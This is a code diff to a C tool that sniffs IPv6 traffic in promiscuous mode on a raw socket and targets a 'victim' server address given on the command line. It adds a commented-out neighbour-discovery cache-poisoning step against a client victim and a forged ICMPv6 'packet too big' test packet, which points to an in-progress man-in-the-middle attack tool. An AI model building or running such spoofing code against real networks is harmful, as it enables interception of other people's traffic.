@@ -20,28 +20,11 @@
 #include <netinet/tcp.h>
 #include <netinet/ether.h>
 
+#include <victims.h>
 #include <packets.h>
+#include <device.h>
 
 #define DEBUG 0
-#define PRINTABLE_ETHADDR(dest, addr) sprintf(dest, \
-					"%.2x:%.2x:%.2x:%.2x:%.2x:%.2x", \
-					(unsigned char)addr[0], \
-					(unsigned char)addr[1], \
-					(unsigned char)addr[2], \
-					(unsigned char)addr[3], \
-					(unsigned char)addr[4], \
-					(unsigned char)addr[5]);
-
-typedef struct device_info {
-	int index;
-	char name[IFNAMSIZ];
-	unsigned int ifa_flags;
-	struct sockaddr_in ipv4;
-	struct sockaddr_in6 ipv6;
-	struct ether_addr hwaddr;
-} device_info;
-
-struct device_info device;
 
 static int raw_socket(int proto) {
 	int rawsock;
@@ -52,76 +35,6 @@ static int raw_socket(int proto) {
 	}
 
 	return rawsock;
-}
-
-void load_device_info(const char *dev_name) {
-	struct ifaddrs *ifaddr, *ifa;
-	struct ifreq ifr;
-	int sk;
-
-	if (!dev_name) {
-		printf("No device name.\n");
-		exit(EXIT_FAILURE);
-	}
-
-	strncpy(device.name, dev_name, IFNAMSIZ);
-
-	if (getifaddrs(&ifaddr) == -1) {
-		perror("getifaddrs: ");
-		exit(EXIT_FAILURE);
-	}
-
-	for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
-		if (strcmp(dev_name, ifa->ifa_name) == 0) {
-			if (ifa->ifa_addr->sa_family == AF_INET6)
-				device.ipv6 = *(struct sockaddr_in6 *)(ifa->ifa_addr);
-			else if (ifa->ifa_addr->sa_family == AF_INET)
-				device.ipv4 = *(struct sockaddr_in *)(ifa->ifa_addr);
-
-			if (ifa->ifa_flags != device.ifa_flags)
-				device.ifa_flags = ifa->ifa_flags;
-		}
-	}
-	freeifaddrs(ifaddr);
-
-	strcpy(ifr.ifr_name, dev_name);
-	if ((sk = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
-		perror("Can't open socket: ");
-		exit(EXIT_FAILURE);
-	}
-
-	/* First Get the Interface Index  */
-	if ((ioctl(sk, SIOCGIFINDEX, &ifr)) == -1) {
-		perror("Error getting Interface index: ");
-		exit(EXIT_FAILURE);
-	}
-
-	device.index = ifr.ifr_ifindex;
-
-	/* Get hwaddr information */
-	if ((ioctl(sk, SIOCGIFHWADDR, &ifr)) == -1) {
-		perror("Error getting mac address information: ");
-		exit(EXIT_FAILURE);
-	}
-
-	memcpy(device.hwaddr.ether_addr_octet, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
-}
-
-static void dump_device_info(void) {
-	char host[255];
-
-	printf("- DEVICE DUMP -\n");
-	printf("Name: %s\n", device.name);
-	printf("Index: %i\n", device.index);
-	printf("Flags: 0x%X\n", device.ifa_flags);
-
-	inet_ntop(AF_INET6, &(device.ipv6.sin6_addr), host, 255);
-	printf("IPv6: %s\n", host);
-
-	inet_ntop(AF_INET, &(device.ipv4.sin_addr), host, 255);
-	printf("IPv4: %s\n", host);
-
-	printf("HWAddr: %s\n\n", ether_ntoa((struct ether_addr *)&device.hwaddr));
 }
 
 static int bind_socket_to_device(char *device, int rawsock) {
@@ -149,14 +62,14 @@ static int bind_socket_to_device(char *device, int rawsock) {
 	pkt->mr_ifindex = ifr.ifr_ifindex;
 	pkt->mr_type = PACKET_MR_PROMISC;
 	setsockopt(rawsock, SOL_PACKET, PACKET_MR_PROMISC, (char *)&pkt,
-									sizeof(struct packet_mreq));
+			sizeof(struct packet_mreq));
 
 	free(pkt);
 
 	return 1;
 }
 
-void debug_packet(unsigned char *packet, int len) {
+void packet_action(char *packet, int len) {
 	struct ethhdr *eth;
 	struct ip6_hdr *ip6;
 	struct icmp6_hdr *icmpv6;
@@ -212,6 +125,13 @@ void debug_packet(unsigned char *packet, int len) {
 			icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
 			printf("ICMPv6 DEBUG:\n");
 			printf("Type: %d\n", icmpv6->icmp6_type);
+			/*
+			if (icmpv6->icmp6_type == ND_NEIGHBOR_SOLICIT && cvictim.poisoned == 0)
+				if (solicitation_to_svictim(icmpv6)) {
+					cvictim.poisoned = 1;
+					poison_cvictim(ip6->ip6_src.s6_addr);	// This should be a thread
+				}
+			*/
 			break;
 		case IPPROTO_TCP:
 			tcp = (struct tcphdr *)((char *)ip6 + sizeof(struct ip6_hdr));
@@ -228,10 +148,11 @@ void debug_packet(unsigned char *packet, int len) {
 
 int main(int argc, char **argv) {
 	int raw, len;
-	unsigned char packet_buffer[2048];
+	char packet_buffer[2048];
 	struct sockaddr_ll packet_info;
-	char *server_victim;
+	char server_victim[INET6_ADDRSTRLEN];
 	int packet_info_size = sizeof(packet_info);
+	char *teste;
 
 	if (argc < 3) {
 		printf("Usage: %s <interface> <victim's address>\n", argv[0]);
@@ -244,26 +165,30 @@ int main(int argc, char **argv) {
 	/* create the raw socket */
 	/* Maybe someday we will support other protocols */
 	//raw = raw_socket(ETH_P_ALL);
-
 	raw = raw_socket(ETH_P_IPV6);
 
 	/* Bind socket to interface and going promisc */
-	bind_socket_to_device(argv[1], raw);
+	bind_socket_to_device(device.name, raw);
 
 	/* Get number of packets to sniff from user */
-	server_victim = argv[2];
+	if (inet_pton(AF_INET6, argv[2], &svictim.ipv6) <= 0) {
+		printf("Error setting victim's address\n");
+		exit(EXIT_FAILURE);
+	}
+	inet_ntop(AF_INET6, &svictim.ipv6, server_victim, INET6_ADDRSTRLEN);
 	printf("Server to attack: %s\n", server_victim);
 
-	/* Start Sniffing and print Hex of every packet */
-	while (1) {
-		if ((len = recvfrom(raw, packet_buffer, 2048, 0,
-							(struct sockaddr*)&packet_info,
-							(socklen_t *)&packet_info_size)) == -1) {
-			perror("Recv from returned -1: ");
-			exit(-1);
-		} else {
-			debug_packet(packet_buffer, len);
-		}
+	/* START DEBUG TESTE */
+	teste = alloc_pkt2big();
+	packet_action(teste, sizeof(struct ethhdr) +
+						sizeof(struct ip6_hdr) +
+						sizeof(struct icmp6_hdr));
+	/* STOP DEBUG */
+
+	while ((len = recvfrom(raw, packet_buffer, 2048, 0,
+						(struct sockaddr*)&packet_info,
+						(socklen_t *)&packet_info_size)) >= 0) {
+			packet_action(packet_buffer, len);
 	}
 
 	return 0;
